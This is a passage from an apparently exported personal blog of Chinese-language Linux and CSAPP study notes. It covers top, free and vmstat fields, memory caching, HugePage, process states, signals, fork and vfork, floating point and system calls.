nice    : time running niced user processes</span><br><span class=\"line\">        id, idle    : time spent in the kernel idle handler</span><br><span class=\"line\">        wa, IO-wait : time waiting for I/O completion</span><br><span class=\"line\">        hi : time spent servicing hardware interrupts</span><br><span class=\"line\">        si : time spent servicing software interrupts</span><br><span class=\"line\">        st : time stolen from this vm by the hypervisor</span><br><span class=\"line\"></span><br><span class=\"line\">    In  the  alternate  cpu  states  display  modes,  beyond   the   first</span><br><span class=\"line\">    tasks/threads  line,  an  abbreviated  summary  is shown consisting of</span><br><span class=\"line\">    these elements（就是按了`t`键之后显示的内容）:</span><br><span class=\"line\">                   a    b     c    d</span><br><span class=\"line\">        %Cpu(s):  75.0/25.0  100[ ...</span><br><span class=\"line\"></span><br><span class=\"line\">    Where: a) is the combined us and ni percentage; b) is the sy  percent‐</span><br><span class=\"line\">    age; c) is the total; and d) is one of two visual graphs of those rep‐</span><br><span class=\"line\">    resentations.  See topic 4b. SUMMARY AREA Commands and the `t&apos; command</span><br><span class=\"line\">    for additional information on that special 4-way toggle.</span><br><span class=\"line\"></span><br><span class=\"line\">2c. MEMORY Usage</span><br><span class=\"line\">    This  portion  consists  of  two  lines  which  may  express values in</span><br><span class=\"line\">    kibibytes (KiB) through exbibytes (EiB) depending on the scaling  fac‐</span><br><span class=\"line\">    tor enforced with the `E&apos; interactive command.</span><br><span class=\"line\"></span><br><span class=\"line\">    As a default, Line 1 reflects physical memory, classified as:</span><br><span class=\"line\">        total, free, used and buff/cache</span><br><span class=\"line\"></span><br><span class=\"line\">    Line 2 reflects mostly virtual memory, classified as:</span><br><span class=\"line\">        total, free, used and avail (which is physical memory)</span><br><span class=\"line\"></span><br><span class=\"line\">    The  avail number on line 2 is an estimation of physical memory avail‐</span><br><span class=\"line\">    able for starting new applications, without swapping.  Unlike the free</span><br><span class=\"line\">    field,  it  attempts to account for readily reclaimable page cache and</span><br><span class=\"line\">    memory slabs.  It is available on kernels 3.14,  emulated  on  kernels</span><br><span class=\"line\">    2.6.27+, otherwise the same as free.</span><br><span class=\"line\"></span><br><span class=\"line\">    In  the  alternate memory display modes, two abbreviated summary lines</span><br><span class=\"line\">    are shown consisting of these elements:</span><br><span class=\"line\">                   a    b          c</span><br><span class=\"line\">        GiB Mem : 18.7/15.738   [ ...</span><br><span class=\"line\">        GiB Swap:  0.0/7.999    [ ...</span><br><span class=\"line\"></span><br><span class=\"line\">    Where: a) is the percentage used; b) is the total available; and c) is</span><br><span class=\"line\">    one of two visual graphs of those representations.</span><br><span class=\"line\"></span><br><span class=\"line\">    In  the  case  of physical memory, the percentage represents the total</span><br><span class=\"line\">    minus the estimated avail noted above.   The  `Mem&apos;  graph  itself  is</span><br><span class=\"line\">    divided  between used and any remaining memory not otherwise accounted</span><br><span class=\"line\">    for by avail.  See topic 4b. SUMMARY AREA Commands and the `m&apos; command</span><br><span class=\"line\">    for additional information on that special 4-way toggle.</span><br><span class=\"line\"></span><br><span class=\"line\">    This table may help in interpreting the scaled values displayed:</span><br><span class=\"line\">        KiB = kibibyte = 1024 bytes</span><br><span class=\"line\">        MiB = mebibyte = 1024 KiB = 1,048,576 bytes</span><br><span class=\"line\">        GiB = gibibyte = 1024 MiB = 1,073,741,824 bytes</span><br><span class=\"line\">        TiB = tebibyte = 1024 GiB = 1,099,511,627,776 bytes</span><br><span class=\"line\">        PiB = pebibyte = 1024 TiB = 1,125,899,906,842,624 bytes</span><br><span class=\"line\">        EiB = exbibyte = 1024 PiB = 1,152,921,504,606,846,976 bytes</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"free\"><a href=\"#free\" class=\"headerlink\" title=\"free\"></a>free</h4>   <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">free  displays the total amount of free and used physical and swap memory</span><br><span class=\"line\">in the system, as well as the buffers and caches used by the kernel.  The</span><br><span class=\"line\">information  is  gathered by parsing /proc/meminfo. The displayed columns</span><br><span class=\"line\">are:</span><br><span class=\"line\"></span><br><span class=\"line\">total  Total installed memory (MemTotal and SwapTotal in /proc/meminfo)</span><br><span class=\"line\"></span><br><span class=\"line\">used   Used memory (calculated as total - free - buffers - cache)</span><br><span class=\"line\"></span><br><span class=\"line\">free   Unused memory (MemFree and SwapFree in /proc/meminfo)</span><br><span class=\"line\"></span><br><span class=\"line\">shared Memory used (mostly) by tmpfs (Shmem in /proc/meminfo)</span><br><span class=\"line\"></span><br><span class=\"line\">buffers</span><br><span class=\"line\">       Memory used by kernel buffers (Buffers in /proc/meminfo)</span><br><span class=\"line\"></span><br><span class=\"line\">cache  Memory used by the page cache and slabs (Cached  and  SReclaimable</span><br><span class=\"line\">       in /proc/meminfo)</span><br><span class=\"line\"></span><br><span class=\"line\">buff/cache</span><br><span class=\"line\">       Sum of buffers and cache</span><br><span class=\"line\"></span><br><span class=\"line\">available</span><br><span class=\"line\">       Estimation of how much memory is available for starting new appli‐</span><br><span class=\"line\">       cations, without swapping. Unlike the data provided by  the  cache</span><br><span class=\"line\">       or  free fields, this field takes into account page cache and also</span><br><span class=\"line\">       that not all reclaimable memory slabs will  be  reclaimed  due  to</span><br><span class=\"line\">       items  being  in  use (MemAvailable in /proc/meminfo, available on</span><br><span class=\"line\">       kernels 3.14, emulated on kernels 2.6.27+, otherwise the  same  as</span><br><span class=\"line\">       free)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>Buffers vs Cached(<a href=\"https://access.redhat.com/solutions/406773#diag\" target=\"_blank\" rel=\"noopener\">Ref</a>, <a href=\"https://www.kernel.org/doc/Documentation/filesystems/proc.txt\" target=\"_blank\" rel=\"noopener\">Ref</a>)<ul>\n<li>Buffers: Memory in buffer cache, so relatively temporary storage for raw disk blocks. This shouldn’t get very large.</li>\n<li>Cached: Memory in the pagecache (Diskcache and Shared Memory)<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    Buffers: Relatively temporary storage for raw disk blocks</span><br><span class=\"line\">            shouldn&apos;t get tremendously large (20MB or so)</span><br><span class=\"line\">    Cached: in-memory cache for files read from the disk (the</span><br><span class=\"line\">            pagecache).  Doesn&apos;t include SwapCached</span><br><span class=\"line\">SwapCached: Memory that once was swapped out, is swapped back in but</span><br><span class=\"line\">            still also is in the swapfile (if memory is needed it</span><br><span class=\"line\">            doesn&apos;t need to be swapped out AGAIN because it is already</span><br><span class=\"line\">            in the swapfile. This saves I/O)</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"vmstat\"><a href=\"#vmstat\" class=\"headerlink\" title=\"vmstat\"></a>vmstat</h4>   <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FIELD DESCRIPTION FOR VM MODE</span><br><span class=\"line\">   Procs</span><br><span class=\"line\">       r: The number of runnable processes (running or waiting for run time).</span><br><span class=\"line\">       b: The number of processes in uninterruptible sleep.</span><br><span class=\"line\"></span><br><span class=\"line\">   Memory</span><br><span class=\"line\">       swpd: the amount of virtual memory used.</span><br><span class=\"line\">       free: the amount of idle memory.</span><br><span class=\"line\">       buff: the amount of memory used as buffers.</span><br><span class=\"line\">       cache: the amount of memory used as cache.</span><br><span class=\"line\">       inact: the amount of inactive memory.  (-a option)</span><br><span class=\"line\">       active: the amount of active memory.  (-a option)</span><br><span class=\"line\"></span><br><span class=\"line\">   Swap</span><br><span class=\"line\">       si: Amount of memory swapped in from disk (/s).</span><br><span class=\"line\">       so: Amount of memory swapped to disk (/s).</span><br><span class=\"line\"></span><br><span class=\"line\">   IO</span><br><span class=\"line\">       bi: Blocks received from a block device (blocks/s).</span><br><span class=\"line\">       bo: Blocks sent to a block device (blocks/s).</span><br><span class=\"line\"></span><br><span class=\"line\">   System</span><br><span class=\"line\">       in: The number of interrupts per second, including the clock.</span><br><span class=\"line\">       cs: The number of context switches per second.</span><br><span class=\"line\"></span><br><span class=\"line\">   CPU</span><br><span class=\"line\">       These are percentages of total CPU time.</span><br><span class=\"line\">       us: Time spent running non-kernel code.  (user time, including nice time)</span><br><span class=\"line\">       sy: Time spent running kernel code.  (system time)</span><br><span class=\"line\">       id: Time spent idle.  Prior to Linux 2.5.41, this includes IO-wait time.</span><br><span class=\"line\">       wa: Time spent waiting for IO.  Prior to Linux 2.5.41, included in idle.</span><br><span class=\"line\">       st: Time stolen from a virtual machine.  Prior to Linux 2.6.11, unknown.</span><br></pre></td></tr></table></figure>\n<ul>\n<li>buff vs cache<blockquote>\n<p><a href=\"http://tldp.org/LDP/sag/html/buffer-cache.html\" target=\"_blank\" rel=\"noopener\">tldp-buffer-cache</a></p>\n<ul>\n<li>By reading the information from disk only once and then keeping it in memory until no longer needed, one can speed up all but the first read. This is called disk buffering, and the memory used for the purpose is called the buffer cache.</li>\n<li>To make the most efficient use of real memory, Linux automatically uses all free RAM for buffer cache, but also automatically makes the cache smaller when programs need more memory. Under Linux, you do not need to do anything to make use of the cache, it</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"HugePage\"><a href=\"#HugePage\" class=\"headerlink\" title=\"HugePage\"></a>HugePage</h3><ul>\n<li>好处<ul>\n<li>增加TLB命中率</li>\n<li>减小页表大小</li>\n<li>如果可以把多级页表的级数减少，则可以减小查页表时间</li>\n</ul>\n</li>\n<li><p>缺点</p>\n<ul>\n<li>有一些需要页对齐的场景那么为了对齐浪费的空间就比较多</li>\n<li>页表提供的内存保护是以页为单位的</li>\n<li>缺页时需要调入的东西增加</li>\n<li>共享内存时需要共享整数个页那么大的块（我认为如此，因为是通过在页表中填入相同的物理页地址来共享内存的）</li>\n<li><p>Cache的命中率可能会降低，比如如果有的东西需要放在相邻的两个页上，那么4K页时，其实两个东西都可以缓存在L1，但是对于4M的页则不行</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Model name:          Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz</span><br><span class=\"line\">L1d cache:           32K</span><br><span class=\"line\">L1i cache:           32K</span><br><span class=\"line\">L2 cache:            256K</span><br><span class=\"line\">L3 cache:            8192K</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>因为程序所占用的物理内存都需要在页表有记录，那么hugePage意味着小应用会占用更多内存</p>\n</li>\n<li>mmap<blockquote>\n<p>on Linux, the mapping will be created at a nearby page boundary.<br>offset must be a multiple of the page size as returned by sysconf(_SC_PAGE_SIZE).</p>\n</blockquote>\n</li>\n</ul>\n</li>\n<li>其他影响<ul>\n<li>块（文件系统的一种抽象，文件系统的最小寻址单元，只能基于块来访问文件系统）不能比page大（This is an artificial constraint that could go away in the future），所以hugepage会使得块可以很大</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"malloc\"><a href=\"#malloc\" class=\"headerlink\" title=\"malloc\"></a>malloc</h3><ul>\n<li>调用并分配1GB的内存，是否物理内存就会少1G？一方面，CopyOnWrite，所以如果没有写，是不会的。另一方面，空闲链表</li>\n</ul>\n<h3 id=\"MISC-1\"><a href=\"#MISC-1\" class=\"headerlink\" title=\"MISC\"></a>MISC</h3><ul>\n<li>需要对目录有<code>x</code>权限才能cd进目录</li>\n</ul>\n","slug":"My-Linux-Note","categories":[{"name":"Linux","slug":"Linux","permalink":"https://h-zex.github.io/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://h-zex.github.io/tags/Linux/"},{"name":"CFS","slug":"CFS","permalink":"https://h-zex.github.io/tags/CFS/"},{"name":"epoll","slug":"epoll","permalink":"https://h-zex.github.io/tags/epoll/"}]},{"title":"My CSAPP Note","date":"2019-05-01T02:09:50.000Z","path":"2019/05/01/My-CSAPP-Note/","text":"double to unsigned long long12unsigned long long a = (unsinged long long)(2.0); // a==2unsigned long long a = (unsinged long long)(-2.0); // a==140735559226888 double to long long用的是特殊的指令 进程 进程是内核定义的抽象实体，并为该实体分配可用以执行程序的各项系统资源 提供一个假象：当前程序是OS中的唯一程序 定义：一个执行中的程序的实例 一个独立的逻辑控制流，一个私有的地址空间 地址空间，从低到高是 x86-64从0x400000开始，x86-32从0x8048000开始，gcc的-fPIE(Position-independent executables)则会使得EP变成0x10a0，不清楚运行时是否会变 只读代码段（.init, .rodata, .text） 读/写段（.data, .bss），包含显式初始化的全局变量和静态变量，跟只读代码段一样都是从可执行文件中加载的 运行时堆（堆顶由brk指示(brk，由内核维护，进程私有)，向上增长） 共享库的内存映射区域（向上增长） 用户栈（运行时创建，rsp是栈指针，向下增长） 内核虚拟内存（依次为代码、数据、物理内存映射（大小等于DRAM的数目）、页表、task和mm结构、内核栈（内核在进程的上下文中执行代码时使用的栈），用户不可见） 进程的三种状态（从程序员的视角来看） 运行 停止，不会被调度，收到SIGSTOP、SIGTSTP、SIGTTIN，SIGTTOU信号时停止直到收到SIGCONT SIGSTOP：不是来自终端的停止信号，不能被捕获或忽略 SIGTSTP：来自终端的停止信号，键入Ctrl+Z会发送SIGTSTP给前台job的每个进程，默认是停止（挂起）前台job SIGTTIN Only the foreground job receives terminal input. It is not an error for a background job to try to read from the terminal, but the terminal driver detects this and sends a special signal to the background job: SIGTTIN. This signal normally stops the background job; by using the shell, we are notified of this event and can bring the job into the foreground so that it can read from the terminal. 1234567891011121314&gt; $ cat &gt; /tmp/23 &amp;&gt; [1] 7739&gt;&gt; $ &gt; [1] + 7739 suspended (tty input) bat &gt; /tmp/23&gt; &gt; $ fg&gt; [1] + 7739 continued bat &gt; /tmp/23&gt; testMsg&gt; ^C&gt; &gt; $ /bin/cat /tmp/23 &gt; testMsg&gt; SIGTTOU When we disallow background jobs from writing to the controlling terminal, cat will block when it tries to write to its standard output, because the terminal driver identifies the write as coming from a background process and sends the job the SIGTTOU signal. As with the previous example, when we use the shell’s fg command to bring the job into the foreground, the job completes. 123456789101112131415161718&gt; $ /bin/cat /tmp/23 &amp;&gt; [1] 8398&gt; testMsg &gt; &gt; [1] + 8398 done /bin/cat /tmp/23&gt; &gt; $ fg&gt; fg: no current job&gt; &gt; $ stty tostop &gt; &gt; $ /bin/cat /tmp/23 &amp;&gt; [1] 8412&gt; [1] + 8412 suspended (tty output) /bin/cat /tmp/23 &gt; &gt; $ fg&gt; [1] + 8412 continued /bin/cat /tmp/23&gt; testMsg&gt; 终止，永久停止。三种原因：收到一个信号，该信号handler终止该进程，从主程序返回，调用exit函数（exit函数不返回）（可以通过exit(status)终止进程并返回status，也可以通过return status终止进程并返回status） 进程的状态 来自linux内核设计与实现 TASK_RUNNING：进程是可执行的，可能正在执行，或在运行队列中等待执行。这是进程在用户空间中执行的唯一可能状态。内核空间中正在执行的进程也是这种状态 TASK_INTERRUPTIBLE：进程正在睡眠（也就是被阻塞），到达某些条件达成，一旦条件达成，内核就会把进程状态设置为RUNNING。处于此状态的进程会因为接收到信号而提前被唤醒并随时准备投入运行 TASK_UNINTERRUPTIBLE：与TASK_INTERRUPTIBLE的差别在于，就算接受到信号也不会被唤醒（即使是SIGKILL信号）或准备投入运行。通常在进程必须在等待时不受干扰或等待的事件很快就会发生时出现（比如这个任务正在进行重要的操作，甚至可能持有一个信号量）。因为不对信号做响应，所以较之可中断的状态，用的较少。（ps中看到的D状态的进程就是这种状态） __TASK_TRACED：被其他进程跟踪的进程，比如通过ptrace对调试程序进行跟踪 __TASK_STOPPED：进程停止执行，没有投入运行也不能投入运行。发生在接受到SIGSTOP，SIGTSTP，SIGTTIN，SIGTTOU信号时，调试期间受到任何信号也会使得进程进入这状态 转换图见书P24(41) Ref: ps manual 12345678910the state of a process: D uninterruptible sleep (usually IO) I Idle kernel thread R running or runnable (on run queue) S interruptible sleep (waiting for an event to complete) T stopped by job control signal t stopped by debugger during the tracing W paging (not valid since the 2.6.xx kernel) X dead (should never be seen) Z defunct (&quot;zombie&quot;) process, terminated but not reaped by its parent 子进程终止了，需要父进程回收，父进程终止时，子进程没有终止（可以是僵尸进程），则init（pid=1，不终止）为子进程的养父 作业（job）和进程组 unix shell使用job表示为对一条命令行求值而创建的进程 任何时刻，至多只有一个前台作业和0或多个后台作业 例子：ls | sort会创建一个由两个进程组成的前台作业，两个进程通过unix管道连接起来 进程组 shell为每个job创建一个独立的进程组 进程组ID通常取自job中父进程中的一个 daemon 生命周期长，通常在系统启动时就被创建并一直运行到系统关闭 在后台运行并且不拥有任何控制终端，这确保了内核永远不会为daemon自动生成任何任务控制信号以及终端相关的信号 通常以d作为程序名称的后缀 特定的daemon会作为内核线程运行，此类的daemon的代码是内核的一部分，通常在系统启动时被创建，ps列出的线程中，这些daemon会用[]括起来 很多标准的daemon是通过系统关闭时执行特定于应用程序的脚本来关闭的，不以这种方式关闭的daemon会收到SIGTERM信号，因为系统关闭时，init进程会向所有其子进程发送这个信号，默认SIGTERM会终止一个进程，可以为这个信号建立处理器。init在发出SIGTERM信号5s后会发送SIGKILL信号 创建daemon过程，见TLPI 37.2 创建新进程 fork后，子进程通过execve调用启动加载器 加载器删除子进程现有的虚拟内存段，并创建一组新的代码、数据、堆、栈段 loader跳转到_start地址，最终会调用main函数 除了一些头部信息，加载过程中没有从磁盘到内存的数据复制，直到被引用时，OS才会使用页面调度机制自动将页面从磁盘传送到内存 fork 子进程与父进程的用户级虚拟地址空间相同的（互相独立）的一份副本，包括代码和数据段、堆、共享库、用户栈 相同的描述符表（所以可以读写父进程打开的任何文件） 最大的区别是有不同的PID 父进程返回子进程的pid，子进程返回0（pid总是非零） vfork 在SUSv3已经标记为过时的，SUSv4则从规范中剔除了，CopyOnWrite的fork已经足够快了，并且有些OS还把vfork实现为fork 无需为子进程复制虚拟内存或页表，共享父进程的内存，直到成功执行exec或_exit（不是exit） 子进程执行exec或_exit之前，暂停执行父进程 子进程不应该调用exit退出，因为其会导致父进程stdio的缓冲区刷新和关闭（更详细的见TLPI 25.4） 保证子进程先于父进程获得调度获得CPU（fork无法保证这点） 系统是在内核空间为每个进程维护文件描述符表的，且在vfork调用期间复制该表，所以子进程对文件描述符表的操作不会影响到父进程（对stdio的操作会，然而虽然文件描述符表是不同的，但是打开文件表不是相同的吗，操作后不就改变了文件位置了吗） SUSv3指出，以下行为是未定义的 修改了出用于存储vfork返回值的pid_t变量之外的任何数据 从调用vfork的函数返回（我认为，应该是因为会影响栈） 在成功地调用_exit或执行了exec之前，调用了任何其他函数 IEEE754 最高比特为sign（0为正，1为负），接下来的8bit（float32是8it，double64是11bit）是exp，剩下的是significand（尾数） 规格化：0&lt;exp&lt;255(2047)，此时exp的含义是exp-127(1023)，尾数部分是1.M，M为尾数部分的二进制表达的数值。 非规格化：exp=0，此时exp的含义是exp=-126(-1022)，尾数部分是0.M，要就是没有前缀1，从而，从exp=1到exp=0是平滑的过渡——exp没有变，然后对应的从1.111111....到1到0.11111111111....到0。其用于表示0和非常接近0的数，可能的数值均匀的接近于0.0 无穷大：exp=255(2047)，尾数是全0 NaN：exp=255(2047)，尾数非0 浮点数加法不具有结合律和分配率，有交换律 $1/+0=+\\infin$，$1/-0=-\\infin$ 汇编 参数寄存器：rdi, rsi, rdx, rcx, r8, r9 返回值：rax 栈指针：rsp 对抗缓冲区溢出攻击 ASLR(Address space layout randomization)（每次运行，程序代码、库代码、栈、全局变量、堆在内存的不同区域） 栈破坏检测（金丝雀值，栈帧中任何局部缓冲区和栈状态之间存一个特殊的金丝雀值） 限制可执行代码的区域（一些内存页上的东西不允许执行） 数据对齐 计算机系统对基本数据类型的合法地址做出一些限制 对齐简化了处理器和内存系统之间的接口设计——比如，读一个8B东西读一次就行，不必读两次 无论数据是否对齐，x86-64都可以正确工作，但是可以提高系统性能。另外，没有对其，SSE指令可能无法正确执行，AVX对于对齐么有强制性要求 对于struct，为了使得结构内每个字段都对其，会有padding，结尾可能有padding，以满足结构数组内每个struct的对齐要求 页表中，我们可以查询得到PPN（physical page number），但是PPO（物理页内位移）是低k位，这意味着，每个页需要$2^k$对齐，这样子才能使得PPN描述出该页的起始位置——因为我们都是拿到起始位置后加上offset（正数，也是虚拟地址的低k bit）获得target。PPO的12bit刚好与cache的页内偏移位数+组数目的bit数相同，所以可以直接使用PPO去索引相应的组和具体的word，然后等待PPN，与组内的那些tag来查找匹配 优化性能 消除不必要的内存引用，使得可以编译器敢于缓存在寄存器中 循环展开，一方面减少循环控制代码，另一方面可以有更大的优化空间 提高并行性，比如进行累计运算时，使用多个acc变量，从而增加关键路径的数目，比如利用结合律，使得一些运算可以并行执行( $abcd \\rightarrow (ab)(cd)$)，后者可以更快 减少读写相关的代码：比如刚写完个一个cell，立刻就又要读了 存储 磁盘寻道时，任意时刻读写头都位于同一柱面 SSD的随机写性能较低，因为一个擦除过的块才可能被写 局部性原理的体现：cache、虚拟内存每次加载一个页 cache 全相联cache：只有一个组，电路必须并行的搜索许多tag，所以昂贵、难度大，只适合作为非常小的cache，比如TLB 组相联：一个组有多路 直接映射 写：直写，每次都下一级cache，引起总线流量。写回，尽可能推迟更新下一级，但是要维护dirty bit。对于较长的传送时间，通常更倾向于写回而不是直写。 写不命中：写分配，加载下一级的块上来，然后更新这个块。非写分配，直接写到下一级。直写cache通常是非写分配的，写会cache通常是写分配的。 写、写不命中的细节随系统而变化 每次加载、驱逐都是一行一行的来 动态共享库 好处 其text段在内存中只需要一份拷贝，可以被映射到不同进程的地址空间 可以热更新服务器应用 应用无需重新编译，只需要重新分发共享库即可 异常控制流 系统需要对系统状态的变化做出反应，这些状态不一定跟当前正在执行的进程有关。比如IO设备、定时器产生的信号 可以发生在：硬件层（硬件的信号导致转移到异常处理程序）、OS层（比如上下文切换）、应用层（比如一个进程给另一个进程发送信号，从而接受者会突然转去执行信号处理程序，比如非本地跳转） ECF是计算机系统实现并发的基本机制，并发的例子有 中断应用程序执行的异常处理程序 中断应用程序执行的信号处理程序 在时间上重叠执行的进程和线程 异常 这里的异常包括同步异常（trap、fault、abort）和异步异常（中断），有些厂商的手册中，异常只包括同步事件引起的控制流的改变 异常是控制流中的突变，用来响应处理器状态中的某些变化 异常号 每种类型的异常都分配了一个唯一的非负整数的异常号 一些由处理器的设计者分配（比如被零除，缺页、内存访问违例、断点、算术运算溢出） 其他由OS内核（OS内核：OS常驻内存的那部分）的设计者分配（比如syscall、来自外部IO设备的信号） 异常表 系统启动时（计算机重启或加电时）OS分配和初始化的一张跳转表 条目k包含异常k的handler的地址 异常表的起始地址放在一个叫做异常表基址寄存器的CPU寄存器中 过程 在运行时（OS执行某个程序时），处理器检测到发生一个事件（比如page fault、算数溢出、除零、系统定时器产生的信号、IO请求完成等），并确定对应的异常号k 随后处理器触发异常，方法是执行间接过程调用，通过异常表的表目k转到相应的handler 处理完后可能会返回当前指令、返回给当前指令的下一条指令、终止被中断的程序 调用过程 处理器将返回地址入栈，根据异常类型，返回地址可能是当前指令，可能是下一条指令。还需要入栈一些额外的信息，重新开始执行被中断的程序需要这些信息 When control is being transferred from a user program to the kernel, all of these items are pushed onto the kernel’s stack rather than onto the user’s stack.(我猜，是不是如果是信号handler，则压入用户栈，否则内核栈) 异常handler运行在内核模式 硬件触发了异常后，剩下的工作都是软件的handler的。handler可以可选的执行“从中断返回”的指令，这将恢复现场并且切换为用户态（如果被中断的是一个用户程序的话），并将控制返回给被中断的程序 异常的类别 中断：来自处理器外部的IO设备的信号的结果，异步，总是返回到下一条指令，其Handler常常称为中断处理程序 I/O interrupt from external device Hittinng Ctrl-C at the keyboard Arrival of a packet from a network Arrival of data from a disk 过程举例 网络适配器，给处理器芯片的一个引脚发信号，并把中断号放在系统总线上，来触发中断，异常号标志了引起中断的设备 当前指令完成后，处理器注意到中断引脚的电压变高了，就从总线读取中断号，并调用相应的Handler trap：有意的异常(syscall, breakpoint traps, special instructions)，同步，返回到下一条指令 syscall：用户执行syscall n，导致到一个异常处理程序的trap，这个handler解析参数，并调用适当的内核程序，syscall可以执行特权指令，并且可以访问内核中的栈 fault：潜在可恢复的异常（错误情况引起的，比如缺页异常），同步，可能返回到当前指令（否则，Handler返回到内核中的abort例程）。故障发生时，处理器将控制权转移到handler，如果handler可以处理这个错误情况，那么就将控制返回到引起故障的指令，从而重新执行它，否则返回到abort例程 abort：不可恢复的异常（通常是一些硬件错误），同步，不返回 异步异常是由处理器外部的IO设备中的事件产生的，不是由任何一条专门的指令造成的，同步异常是执行一条指令（这种指令叫做故障指令）的产物。（来自百度百科：异步双方不需要共同的时钟，也就是接收方不知道发送方什么时候发送） 一般保护故障（异常13），通常是因为一个程序引用了一个未定义的虚拟内存区域，或者是尝试写一个readOnly的text段，Linux shell把这个报告为Segment fault linux的syscall 每个syscall都有一个唯一的整数号，对应与一个到内核中的跳转表（这个跳转表不同于异常表）的偏移量 所有到linux syscall的参数都是通过通用寄存器而不是栈传递的。rax包含syscall号 C函数库的wrapper需要将参数复制到寄存器 参数都是通过通用寄存器传递的，而不是通过栈传递的 按照惯例，rax包含系统调用号，rdi、rsi、rdx、r10、r8、r9包含最多的6个参数，以上顺序也是参数的顺序（第一个在rdi，第二个在rsi以此类推） 返回时，rcx、r11的内容会被破坏(应该就是caller save)，rax包含返回值，-4095到-1对应于负的errno 执行机器指令，引起处理器从用户态切换到内核态，并执行系统中断0x80的中断向量所指向的代码 响应中断0x80，内核调用system_call()例程，在内核栈保存寄存器值，根据syscall编号索引服务例程的地址。服务例程执行必要任务时，可能会在用户内存和内核内存之间传送数据，完成后返回给system_call例程 从内核栈中回复各寄存器的值，并将syscall的返回值放在栈上，返回wrapper，并切换到用户态 内核态 vs 用户态 通常实现为，某个控制寄存器的一个mode bit来指示 用户态不允许特权指令，比如停止处理器、改变mode bit、发起IO，不能引用地址空间中内核区内的代码和数据，否则会保护故障 从用户态到内核态的唯一方法：通过诸如中断、故障、trap之类的异常。异常发生时，控制传递到处理程序，处理程序运行在内核模式 /proc可以让用户模式进程访问内核数据结构 从2.6开始，/sys文件系统输出系统总线和设备的额外的底层信息 上下文切换 一种较高层次的异常控制流，建立在前面讨论过的较低层次的异常机制之上，用来实现多任务 上下文：内核重新启动一个被抢占的进程所需的状态，通用目的寄存器、浮点寄存器、程序计数器、用户栈、状态寄存器、内核栈、各种内核数据结构（比如页表、包含有关当前进程信息的进程表、包含进程已打开文件的信息的文件表） 步骤包括：保存当前进程的上下文，恢复某个被抢占的进程的上下文，将控制传递新恢复的进程 syscall时，可能发生上下文切换，比如wait cond、read阻塞、sleep。即使syscall没有阻塞，内核也可以决定执行上下文切换 看起来就像，OS利用三种同步的异常来借机上下文切换，如果没有，就借助定时器的中断 信号 软件形式的异常，允许进程和内核中断其他进程 底层硬件异常是由内核的Handler处理，对用户进程不可见，而信号就提供了一种机制来通知用户进程发生了这个异常（比如一个进程试图除以0，那么内核就会给它发SIGFPE信号） 发送信号：内核通过更新目的进程的上下文中的某个状态来发送一个信号。两种原因：内核检测到一个系统事件，所以发信号、kill函数（一个进程调用kill函数，显式的要求内核给这个进程发信号，可以给自己发信号） 目的进程被内核强迫以某种方式对信号做出反应时，就接受了信号。内核把进程从内核态切换到用户态时，会强制用户接受信号（如果有的话） 一个发出但是还没有接收的信号叫做待处理信号 一个类型最多只有一个待处理信号 进程可以有选择的阻塞某类信号，如果进程收到被阻塞的信号，那么会把这个信号加入到等待集合中，之后解除锁定后，会随之传递给此进程 每个进程都只属于一个进程组，父进程和子进程同属一个进程组，可以调用setpgid来改变 键入Ctrl+C会导致内核发送一个SIGINT给前台进程组的每个进程，默认情况下结果是终止前台job 键入Ctrl+Z会发送SIGTSTP给前台job的每个进程，默认是停止（挂起）前台job 信号处理程序可以被其他信号处理程序（不是同一个信号的handler）中断 阻塞信号 